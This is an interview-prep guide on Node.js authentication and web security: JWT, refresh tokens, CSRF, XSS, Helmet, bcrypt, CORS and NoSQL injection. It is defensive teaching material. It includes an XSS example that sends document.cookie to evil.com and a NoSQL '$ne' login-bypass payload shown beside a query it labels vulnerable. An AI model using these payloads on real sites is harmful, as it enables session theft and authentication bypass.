# Security & Auth – Interview Questions & Answers

Questions that were really asked in interviews (company rounds, online interview reports, YouTube
interviews).
Ordered by priority: the question asked by the most interviewers comes first.

---

1. What is JWT and how is it used for authentication and authorization?
   *(Asked 3×: Persistent Systems, American Express, TCS (online))*

==> JWT (JSON Web Token) is a small, signed token that carries user info (like user id and role).
    - **Authentication (who are you):** user logs in → server checks password → server creates a JWT
      signed with a secret → sends it to the client.
    - Client sends the token on every request in the header: `Authorization: Bearer <token>`.
    - Server checks the signature with `jwt.verify`. If valid, it trusts the user id inside.
    - **Authorization (what can you do):** server reads the role from the token and allows or blocks
      the action.
    - It is **stateless**: the server does not need to store sessions.

    ```js
    const jwt = require('jsonwebtoken');

    // login
    const token = jwt.sign({ id: user.id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '15m' });

    // later, on each request
    const payload = jwt.verify(token, process.env.JWT_SECRET); // throws if fake or expired
    ```

    In short: JWT = signed ID card. Signed, **not encrypted**, so never put passwords or secrets in
    it.

---

2. How can you secure a Node.js API? What best practices should be followed?
   *(Asked 3×: Persistent Systems, Wipro, TechnoVerse Solutions)*

==> Main points:
    - **HTTPS** everywhere.
    - **Authentication** (JWT/OAuth) and **authorization** (role checks) on every protected route.
    - **Validate input** (Joi / zod / express-validator) and use **parameterized queries** to stop
      SQL/NoSQL injection.
    - **Helmet** to set security headers.
    - **Rate limiting** (express-rate-limit) to stop brute force and abuse.
    - **CORS** only for trusted origins.
    - Hash passwords with **bcrypt**; keep secrets in env variables / a secrets manager, never in
      code.
    - Don't leak error details (stack traces) to the client.
    - Keep packages updated (`npm audit`) and log/monitor suspicious activity.

    ```js
    const express = require('express');
    const helmet = require('helmet');
    const rateLimit = require('express-rate-limit');
    const cors = require('cors');

    const app = express();
    app.use(helmet());
    app.use(cors({ origin: 'https://myapp.com' }));
    app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));
    app.use(express.json({ limit: '10kb' }));
    ```

---

3. Which library did you use for authentication (jsonwebtoken)? Other than JWT, which module
   (Passport)?
   *(Asked 2×: Web3Dev, EarlyCoder 5-yr Node (YT))*

==> Sample answer: "I used **jsonwebtoken** to sign and verify tokens, and **bcrypt** to hash
    passwords. I have also used **Passport.js**."
    - **Passport** is authentication middleware for Express with many "strategies":
    - `passport-local` → username + password login
    - `passport-jwt` → check JWT on routes
    - `passport-google-oauth20`, GitHub, Facebook → social login (OAuth)
    - Benefit: one common way to plug in many login methods.

    Interview tip: if asked "Passport for what?", say "for login strategies, especially
    Google/social login via OAuth".

---

4. What is the difference between authentication and authorization?
   *(Asked 2×: Capsitech, Dehaat)*

==>
    +--------------+---------------------------------+----------------------------------+
    |              | Authentication                  | Authorization                    |
    +==============+=================================+==================================+
    | Question     | Who are you?                    | What are you allowed to do?      |
    +--------------+---------------------------------+----------------------------------+
    | When         | First                           | After authentication             |
    +--------------+---------------------------------+----------------------------------+
    | How          | Password, OTP, JWT, OAuth login | Roles, permissions (admin, user) |
    +--------------+---------------------------------+----------------------------------+
    | Failure code | 401 Unauthorized                | 403 Forbidden                    |
    +--------------+---------------------------------+----------------------------------+
    | Example      | Logging in to Gmail             | Only admin can delete users      |
    +--------------+---------------------------------+----------------------------------+

    In short: authentication = identity, authorization = permission.

---

5. How do you implement rate limiting in Express?
   *(Asked 2×: Wipro, TechnoVerse Solutions)*

==> Rate limiting = allow only N requests per user/IP in a time window. It stops brute-force and
    DDoS-style abuse.
    Use the `express-rate-limit` package. Extra requests get **429 Too Many Requests**.

    ```js
    const rateLimit = require('express-rate-limit');

    const limiter = rateLimit({
      windowMs: 15 * 60 * 1000, // 15 minutes
      max: 100,                 // 100 requests per IP per window
      message: 'Too many requests, try again later',
    });

    app.use('/api', limiter);

    // stricter limit for login
    app.use('/api/login', rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }));
    ```

    Interview tip: with many servers, use a shared store like **Redis** so all servers share the
    same counts.

---

6. What is the structure of a JWT?
   *(Asked 1×: Senior Node.js round (YT))*

==> Three parts joined by dots: `header.payload.signature`
    - **Header** → algorithm and type, e.g. `{ "alg": "HS256", "typ": "JWT" }`
    - **Payload** → claims (data), e.g. `{ "id": 123, "role": "user", "iat": ..., "exp": ... }`
    - **Signature** → `HMACSHA256(base64url(header) + "." + base64url(payload), secret)`
    - Header and payload are only **Base64URL-encoded**, so anyone can read them.

---

7. How do you verify a JWT? Is it decrypted?
   *(Asked 1×: Senior Node.js round (YT))*

==> **No, it is not decrypted.** A normal JWT is **signed, not encrypted**.
    - `jwt.verify(token, secret)` recalculates the signature from header + payload using the secret
      and compares it with the token's signature.
    - It also checks expiry (`exp`).
    - If something does not match → it throws an error → return 401.

    ```js
    try {
      const user = jwt.verify(token, process.env.JWT_SECRET);
    } catch (err) {
      // invalid signature or expired token
    }
    ```

---

8. What is the difference between jwt.decode and jwt.verify?
   *(Asked 1×: Senior Node.js round (YT))*

==>
    +----------------+------------------------------------------+--------------------------------------------+
    |                | `jwt.decode`                             | `jwt.verify`                               |
    +================+==========================================+============================================+
    | What it does   | Just reads (Base64-decodes) the payload  | Checks signature + expiry, then returns    |
    |                |                                          | payload                                    |
    +----------------+------------------------------------------+--------------------------------------------+
    | Needs secret?  | No                                       | Yes (secret or public key)                 |
    +----------------+------------------------------------------+--------------------------------------------+
    | Safe for auth? | No – a fake token also decodes           | Yes                                        |
    +----------------+------------------------------------------+--------------------------------------------+
    | Use for        | Debugging, reading `exp` on the frontend | Protecting routes                          |
    +----------------+------------------------------------------+--------------------------------------------+

    In short: never trust `decode` for security; always `verify`.

---

9. An attacker changes the user id inside a copied JWT from 123 to 456. How does JWT stop this?
   *(Asked 1×: Senior Node.js round (YT))*

==> The **signature** stops it.
    1. The signature was made from the original header + payload (id 123) using the server's secret.
    2. The attacker changes the payload to 456 but does not know the secret, so he cannot make a new
       valid signature.
    3. `jwt.verify` recalculates the signature for the new payload → it does not match → error →
       401.

    Interview tip: keep the secret strong and private. Note: if the attacker steals the *unchanged*
    token, it still works until it expires — that's why access tokens are short-lived and sent over
    HTTPS.

---

10. How do you protect your APIs from unauthorized access?
   *(Asked 1×: Senior Node.js round (YT))*

==> 
    1. User logs in → gets a short-lived JWT (access token).
    2. Client sends it in the `Authorization: Bearer <token>` header (or an HttpOnly cookie).
    3. An **auth middleware** runs `jwt.verify` on every protected route; invalid/missing → 401.
    4. A **role middleware** checks permission (e.g. admin only); not allowed → 403.
    5. Plus HTTPS, rate limiting, CORS for trusted origins, input validation.

    ```js
    const allowRoles = (...roles) => (req, res, next) =>
      roles.includes(req.user.role) ? next() : res.status(403).json({ message: 'Forbidden' });

    app.delete('/users/:id', auth, allowRoles('admin'), deleteUser);
    ```

---

11. Create a middleware to verify a JWT token
   *(Asked 1×: Wipro)*

==> Read the token from the header, verify it, put the user on `req`, call `next()`.

    ```js
    const jwt = require('jsonwebtoken');

    function auth(req, res, next) {
      const authHeader = req.headers.authorization; // "Bearer <token>"
      if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ message: 'No token provided' });
      }

      const token = authHeader.split(' ')[1];
      try {
        req.user = jwt.verify(token, process.env.JWT_SECRET);
        next();
      } catch (err) {
        return res.status(401).json({ message: 'Invalid or expired token' });
      }
    }

    app.get('/profile', auth, (req, res) => res.json(req.user));
    ```

---

12. Tokens expire every 20 minutes and users get logged out. How do you keep them logged in?
   *(Asked 1×: Senior Node Ep.32 (YT))*

==> Use **access token + refresh token**.
    1. On login, give two tokens: a short **access token** (15–20 min) and a long **refresh token**
       (e.g. 7 days).
    2. Access token is used for normal API calls.
    3. When it expires, the frontend silently calls `/auth/refresh` with the refresh token and gets
       a new access token.
    4. The user never sees a logout until the refresh token itself expires or is revoked.
    5. Store refresh tokens on the server (DB/Redis) so you can revoke them on logout; rotate them
       (new one on every refresh).

---

13. How will the front end know the token expired? Will you make a separate refresh-token API?
   *(Asked 1×: Senior Node Ep.32 (YT))*

==> Yes, a separate API like `POST /auth/refresh`.
    - When the access token is expired, the API returns **401**.
    - The frontend (e.g. an **Axios interceptor**) catches the 401, calls `/auth/refresh`, gets a
      new access token, and **retries the original request**.
    - If refresh also fails → log the user out.

    ```js
    axios.interceptors.response.use(null, async (error) => {
      if (error.response?.status === 401 && !error.config._retry) {
        error.config._retry = true;
        await axios.post('/auth/refresh', {}, { withCredentials: true });
        return axios(error.config); // retry original request
      }
      return Promise.reject(error);
    });
    ```

---

14. When should the front end call the refresh API (polling every 5 minutes is wasteful)?
   *(Asked 1×: Senior Node Ep.32 (YT))*

==> Don't poll. Two good ways:
    - **On demand:** call refresh only when an API returns 401 (interceptor, see Q13).
    - **Just before expiry:** read `exp` from the token (`jwt.decode` / `jwt-decode` on the frontend
      is fine for this) and set one timer to refresh ~1 minute before it expires.
    - Make sure many parallel 401s trigger only **one** refresh call (queue the others).

---

15. Where should the front end store tokens (access vs refresh)? Why?
   *(Asked 1×: Senior Node Ep.32 (YT))*

==> 
    - **Refresh token → HttpOnly + Secure + SameSite cookie.** JavaScript cannot read it, so XSS
      cannot steal it.
    - **Access token → in memory** (a JS variable / React state). Lost on page refresh, but you just
      call `/auth/refresh` again.
    - Avoid **localStorage** for tokens: any XSS script can read it.

    +-----------------+-----------------------+-------------------------------+
    | Storage         | XSS can read?         | Sent automatically?           |
    +=================+=======================+===============================+
    | localStorage    | Yes                   | No                            |
    +-----------------+-----------------------+-------------------------------+
    | Memory          | Hard (gone on reload) | No                            |
    +-----------------+-----------------------+-------------------------------+
    | HttpOnly cookie | No                    | Yes (so protect against CSRF) |
    +-----------------+-----------------------+-------------------------------+

---

16. If the token is in a cookie, it is sent with every request, even from another domain. How do you
    handle that?
   *(Asked 1×: Senior Node Ep.32 (YT))*

==> That's the **CSRF** risk. Fix it with:
    - **`SameSite=Strict` or `Lax`** on the cookie → the browser does not send it on cross-site
      requests (Lax still sends it on top-level GET links).
    - **`HttpOnly`** (JS can't read it) and **`Secure`** (HTTPS only).
    - **CSRF token** as an extra layer for state-changing requests (POST/PUT/DELETE).
    - Never change data with GET requests.

    ```js
    res.cookie('refreshToken', token, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });
    ```

    Note: CORS does **not** stop the cookie from being sent; it only blocks reading the response.

---

17. Why is the access token's expiry shorter than the refresh token's?
   *(Asked 1×: Senior Node Ep.32 (YT))*

==> 
    - The access token is sent on **every** request, so it is exposed more and more likely to be
      stolen.
    - A JWT can't easily be cancelled before it expires. Short life (15 min) = if stolen, it's
      useless soon.
    - The refresh token is sent **only** to `/auth/refresh`, stored safely in an HttpOnly cookie,
      and checked against the DB, so it **can be revoked**. So it can live longer.

    In short: short access token = small damage if stolen; long refresh token = user stays logged
    in.

---

18. How would a token get stolen?
   *(Asked 1×: Senior Node Ep.32 (YT))*

==> 
    - **XSS:** injected script reads it from localStorage / non-HttpOnly cookie.
    - **No HTTPS:** someone on the network (public Wi-Fi) sniffs it (man-in-the-middle).
    - **Logging:** token printed in logs or put in a URL query string.
    - **Malicious browser extensions / malware** on the user's device.
    - **Leaked/shared** tokens (copied into chats, tickets).

    Prevention: HTTPS, HttpOnly cookies, short expiry, no tokens in URLs or logs, sanitize input.

---

19. Logging out in one browser tab: how do you log the user out of all other tabs (React)?
   *(Asked 1×: American Express)*

==> Tell the other tabs that logout happened.
    - **BroadcastChannel API:** send a "logout" message; all tabs listen and log out.
    - Or the **`storage` event:** write a key in localStorage; other tabs get a `storage` event.
    - On the server, revoke the refresh token / clear the cookie so it really ends everywhere.

    ```js
    const channel = new BroadcastChannel('auth');

    function logout() {
      clearUser();
      channel.postMessage('logout');
    }

    useEffect(() => {
      channel.onmessage = (e) => { if (e.data === 'logout') clearUser(); };
      return () => { channel.onmessage = null; };
    }, []);
    ```

---

20. How will you make a new application secure from scratch?
   *(Asked 1×: EarlyCoder 5-yr Node (YT))*

==> 
    1. **Design:** decide roles/permissions, least privilege, HTTPS only.
    2. **Auth:** bcrypt passwords, short JWT access token + refresh token in HttpOnly cookie.
    3. **Input:** validate every request (Joi/zod), parameterized queries/ORM.
    4. **Middleware:** helmet, CORS whitelist, rate limiting, body size limit.
    5. **Secrets:** env variables / AWS Secrets Manager, never in Git.
    6. **Errors & logs:** generic error messages to users, detailed logs internally,
       monitoring/alerts.
    7. **Dependencies:** `npm audit`, Dependabot, keep packages updated.
    8. **Review/test:** code review, security tests (OWASP Top 10 checklist).

---

21. What is your approach to make a secure back end?
   *(Asked 1×: EarlyCoder 5-yr Node (YT))*

==> Same idea as Q20, in short "layers":
    - **Who:** authentication (JWT/OAuth) + authorization (roles) on every route.
    - **What comes in:** validate and sanitize all input; use parameterized queries.
    - **How it travels:** HTTPS, secure cookies, CORS whitelist.
    - **Abuse:** rate limiting, request size limits.
    - **Headers:** helmet.
    - **Secrets & data:** env vars/secrets manager, hash passwords, encrypt sensitive data.
    - **Watch:** logging, monitoring, `npm audit`.

---

22. How do you ensure your code has no security flaws?
   *(Asked 1×: Tech Mahindra (YT))*

==> You can't promise zero flaws, but you reduce them:
    - **Code reviews** with a security checklist (OWASP Top 10).
    - **Linting/static analysis:** ESLint security plugin, SonarQube.
    - **Dependency scanning:** `npm audit`, Snyk, Dependabot.
    - **Tests** for auth/permission cases (e.g. user can't access another user's data).
    - **No secrets in code** (secret scanning in CI).
    - Periodic **penetration testing** and monitoring in production.

---

23. What is an XSS attack?
   *(Asked 1×: Senior Node Ep.32 (YT))*

==> **XSS (Cross-Site Scripting)** = an attacker gets their own JavaScript to run on your website in
    another user's browser.
    - Example: a comment saved as `<script>fetch('https://evil.com?c='+document.cookie)</script>`;
      everyone who views it runs the script.
    - It can steal tokens from localStorage, cookies (if not HttpOnly), or act as the user.
    - Types: **Stored** (saved in DB), **Reflected** (from URL), **DOM-based** (frontend JS writes
      unsafe data into the page).

---

24. How can we prevent XSS attacks?
   *(Asked 1×: Senior Node Ep.32 (YT))*

==> 
    - **Escape output:** React escapes by default; avoid `dangerouslySetInnerHTML` / `innerHTML`.
    - **Sanitize HTML** if you must render it (DOMPurify).
    - **Validate input** on the server.
    - **Content-Security-Policy** header (via helmet) to block inline/unknown scripts.
    - Keep tokens in **HttpOnly cookies** so scripts can't read them.

    ```js
    import DOMPurify from 'dompurify';
    <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userHtml) }} />
    ```

---

25. How do you stop cookies being attached to requests from another domain (CSRF token, SameSite)?
   *(Asked 1×: Senior Node Ep.32 (YT))*

==> Give both answers:
    - **SameSite cookie** (modern, first defence): `SameSite=Strict` → never sent cross-site; `Lax`
      → only on top-level GET navigation. Add `HttpOnly` and `Secure` too.
    - **CSRF token** (classic): server gives a random token; the frontend sends it in a header/form
      field on every POST/PUT/DELETE. A malicious site can't read it, so its forged requests fail.
    - Also: don't change data on GET, and you can check the `Origin` header.

    Note: CORS is not the answer here; CORS controls who can read responses, not whether cookies are
    sent.

---

26. Have you implemented CSRF tokens?
   *(Asked 1×: Senior Node Ep.32 (YT))*

==> Sample answer: "Yes. Our auth cookie is `HttpOnly; Secure; SameSite=Lax`, and for state-changing
    requests we used a CSRF token with the **double-submit cookie** pattern."
    1. Server creates a random token and sets it in a readable cookie (`XSRF-TOKEN`).
    2. Frontend reads it and sends it in a header `X-XSRF-TOKEN` (Axios does this automatically).
    3. Server checks header value === cookie value. Attacker sites can't read the cookie, so they
       can't send the header.

    ```js
    const crypto = require('crypto');

    app.get('/csrf', (req, res) => {
      const token = crypto.randomBytes(32).toString('hex');
      res.cookie('XSRF-TOKEN', token, { secure: true, sameSite: 'strict' });
      res.json({ ok: true });
    });

    function checkCsrf(req, res, next) {
      if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
      const token = req.headers['x-xsrf-token'];
      if (!token || token !== req.cookies['XSRF-TOKEN']) return res.status(403).json({ message: 'Bad CSRF token' });
      next();
    }
    app.use(require('cookie-parser')(), checkCsrf);
    ```

    (The old `csurf` package is deprecated; `csrf-csrf` is a common replacement.)

---

27. How can HTTP headers be used to improve API security?
   *(Asked 1×: Persistent Systems)*

==> Security headers tell the browser to be stricter:
    - `Strict-Transport-Security` (HSTS) → always use HTTPS.
    - `Content-Security-Policy` → only load scripts/styles from allowed sources (stops XSS).
    - `X-Content-Type-Options: nosniff` → don't guess file types.
    - `X-Frame-Options` / CSP `frame-ancestors` → stop clickjacking (site inside an iframe).
    - `Referrer-Policy` → don't leak full URLs.
    - Remove `X-Powered-By: Express` → don't reveal the tech stack.
    - CORS headers (`Access-Control-Allow-Origin`) → only trusted origins.

    Easiest way: `app.use(helmet())`.

---

28. What is Helmet?
   *(Asked 1×: Persistent Systems)*

==> **Helmet** is an Express middleware that sets secure HTTP headers for you in one line (CSP,
    HSTS, X-Frame-Options, nosniff, Referrer-Policy, etc.) and removes `X-Powered-By`.

    ```js
    const helmet = require('helmet');
    app.use(helmet());

    // customize one header
    app.use(helmet.contentSecurityPolicy({
      directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"] },
    }));
    ```

    Interview tip: Helmet is only one layer; you still need auth, validation and rate limiting.

---

## More questions from revision PDFs (not yet asked in a real interview)

Ordered by topic priority: questions from the most-asked topics come first.

---

29. Sessions vs JWT: what is the difference and when do you use each?
   *(Not asked in a real interview yet · From: Gaurav Sharma Node.js notes PDF, Ajeet Yadav Node.js
   revision PDF)*

==> Both remember a logged-in user. The difference is where the login state is stored.
    - Session: the server stores the user data (in memory, Redis or DB) and the client only gets a
      session ID in a cookie. Stateful.
    - JWT: the server signs a token that contains the user data (claims). The client sends it on
      every request; the server just verifies the signature. Stateless.
    - A JWT is signed, not encrypted. Anyone can decode and read the payload, so never put passwords
      or secrets in it.

    +-----------------+--------------------------------------------+--------------------------------------------+
    | Point           | Session                                    | JWT                                        |
    +=================+============================================+============================================+
    | State stored    | On the server (Redis/DB)                   | Inside the token (client side)             |
    +-----------------+--------------------------------------------+--------------------------------------------+
    | Logout / revoke | Easy: delete the session                   | Hard: token is valid till it expires (use  |
    |                 |                                            | short expiry + refresh token or a          |
    |                 |                                            | blocklist)                                 |
    +-----------------+--------------------------------------------+--------------------------------------------+
    | Scaling         | Needs a shared store (Redis) across        | Any server can verify it with the key      |
    |                 | servers                                    |                                            |
    +-----------------+--------------------------------------------+--------------------------------------------+
    | Best for        | Classic web apps, same domain,             | APIs, mobile apps, microservices           |
    |                 | server-rendered                            |                                            |
    +-----------------+--------------------------------------------+--------------------------------------------+

    - Store tokens in httpOnly, Secure cookies where possible (safer from XSS than localStorage).

    In short: Sessions = server remembers you (easy to revoke); JWT = token proves who you are
    (stateless, good for APIs and microservices).

---

30. Why use bcrypt and not SHA-256 for passwords?
   *(Not asked in a real interview yet · From: Gaurav Sharma Node.js notes PDF)*

==> SHA-256 is built to be fast. That is bad for passwords, because an attacker with a stolen DB can
    try billions of guesses per second on a GPU.
    - bcrypt is slow on purpose and has a cost factor (salt rounds). You can increase it as hardware
      gets faster.
    - bcrypt adds a random salt automatically, so two users with the same password get different
      hashes. This defeats rainbow tables.
    - Plain SHA-256 has no built-in salt and no work factor.
    - Other good choices: argon2 (modern recommendation) and scrypt.

    ```js
    const bcrypt = require('bcrypt');

    const hash = await bcrypt.hash(password, 12);     // 12 = cost (salt rounds)
    const ok = await bcrypt.compare(password, hash);  // true / false
    ```

    In short: Password hashing must be slow and salted; bcrypt is, SHA-256 is not.

---

31. What is CORS?
   *(Not asked in a real interview yet · From: Gaurav Sharma Node.js notes PDF, Ajeet Yadav Node.js
   revision PDF)*

==> CORS (Cross-Origin Resource Sharing) is a browser security rule. By default, the browser blocks
    a web page from reading responses from a different origin (different protocol, domain or port).
    - Example: frontend on `http://localhost:3000` calling API on `http://localhost:5000` is
      cross-origin.
    - The server allows it by sending headers like `Access-Control-Allow-Origin`.
    - For non-simple requests (PUT/DELETE, custom headers, JSON content type), the browser first
      sends a preflight `OPTIONS` request.
    - CORS is enforced only by browsers. Postman, curl or server-to-server calls ignore it, so CORS
      is not an authentication mechanism.

    ```js
    const cors = require('cors');
    app.use(cors({
      origin: ['https://myapp.com'], // do not use '*' with credentials
      credentials: true,
    }));
    ```

    In short: CORS is a browser rule; the server uses response headers to say which other origins
    may call it.

---

32. What is NoSQL injection and how do you prevent it?
   *(Not asked in a real interview yet · From: Gaurav Sharma Node.js notes PDF)*

==> NoSQL injection is when a user sends query operators (like `$ne`, `$gt`, `$where`) instead of
    plain values, and they go straight into a MongoDB query.
    - Example attack on login: body is `{ "email": "a@b.com", "password": { "$ne": null } }`. The
      query matches any password, so the attacker logs in.

    ```js
    // Vulnerable
    User.findOne({ email: req.body.email, password: req.body.password });
    ```

    How to prevent:
    1. Validate input types and shape (Joi, Zod, express-validator): password must be a string.
    2. Sanitize: remove keys starting with `$` or containing `.` (e.g. `express-mongo-sanitize`).
    3. Cast values: `String(req.body.email)`.
    4. Use Mongoose schemas (they cast types) and keep `strictQuery` on.
    5. Never use `$where` or build queries from raw user strings.
    6. Compare passwords with bcrypt, not inside the query.

    In short: Never pass raw user objects into queries; validate types and strip `$` operators.

======================================================================================================================================

## What to study first

```
Authentication vs Authorization   (the basic idea behind everything else)
   ↓
JWT                               (structure, sign, verify vs decode)
   ↓
Access & refresh tokens           (expiry, refresh API, where to store tokens)
   ↓
XSS & CSRF                        (how tokens get stolen and how cookies get abused)
   ↓
Security headers & Helmet         (browser-side protection in one line)
   ↓
Rate limiting & API best practices (put all layers together)
```

Authentication vs authorization and JWT are the foundation. Access/refresh tokens and token storage
build on JWT.
XSS and CSRF explain why we use HttpOnly, Secure and SameSite cookies. Helmet, rate limiting and the
best-practice
checklist tie everything into one "secure back end" answer.
